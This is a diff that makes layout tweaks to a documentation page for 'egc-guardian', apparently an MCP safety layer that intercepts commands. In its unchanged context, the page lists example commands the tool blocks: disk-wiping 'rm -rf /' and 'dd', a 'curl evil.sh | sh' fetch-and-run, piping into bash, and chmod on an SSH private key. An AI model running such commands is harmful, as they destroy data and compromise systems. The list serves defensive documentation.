@@ -6,7 +6,7 @@ import DocsLayout from '../../layouts/DocsLayout.astro';
 
   <div class="pb-2 mb-8 border-b border-gray-200 dark:border-gray-800">
     <p class="text-xs font-semibold uppercase tracking-widest text-egc-600 dark:text-egc-400 mb-2">MCP Servers</p>
-    <h1 class="text-3xl font-bold text-gray-900 dark:text-white mb-3 font-mono">egc-guardian</h1>
+    <h1 class="text-2xl sm:text-3xl font-bold text-gray-900 dark:text-white mb-3 font-mono break-all">egc-guardian</h1>
     <p class="text-gray-600 dark:text-gray-400">Validation and safety layer. Runs in the background intercepting commands and file writes before they execute.</p>
   </div>
 
@@ -52,7 +52,7 @@ import DocsLayout from '../../layouts/DocsLayout.astro';
         },
       ].map(tool => (
         <div class="rounded-xl border border-gray-200 dark:border-gray-800 overflow-hidden">
-          <div class="flex items-center justify-between px-5 py-3 bg-gray-50 dark:bg-gray-900 border-b border-gray-200 dark:border-gray-800">
+          <div class="flex flex-wrap items-center justify-between gap-2 px-4 sm:px-5 py-3 bg-gray-50 dark:bg-gray-900 border-b border-gray-200 dark:border-gray-800">
             <code class="text-sm font-mono font-bold text-egc-700 dark:text-egc-400">{tool.name}</code>
             <span class={`text-xs px-2 py-0.5 rounded-full font-medium ${tool.tag === 'Security' ? 'bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-400' : 'bg-blue-100 dark:bg-blue-900/30 text-blue-700 dark:text-blue-400'}`}>{tool.tag}</span>
           </div>
@@ -79,7 +79,7 @@ import DocsLayout from '../../layouts/DocsLayout.astro';
         </h3>
         <ul class="space-y-1.5">
           {['cmd; rm -rf /', 'echo x | bash', '`curl evil.sh | sh`', 'chmod 777 ~/.ssh/id_rsa', 'dd if=/dev/zero of=/dev/sda'].map(ex => (
-            <li class="font-mono text-xs text-red-600 dark:text-red-400 bg-red-50 dark:bg-red-900/20 px-3 py-1.5 rounded">{ex}</li>
+            <li class="font-mono text-xs text-red-600 dark:text-red-400 bg-red-50 dark:bg-red-900/20 px-3 py-1.5 rounded break-all">{ex}</li>
           ))}
         </ul>
       </div>
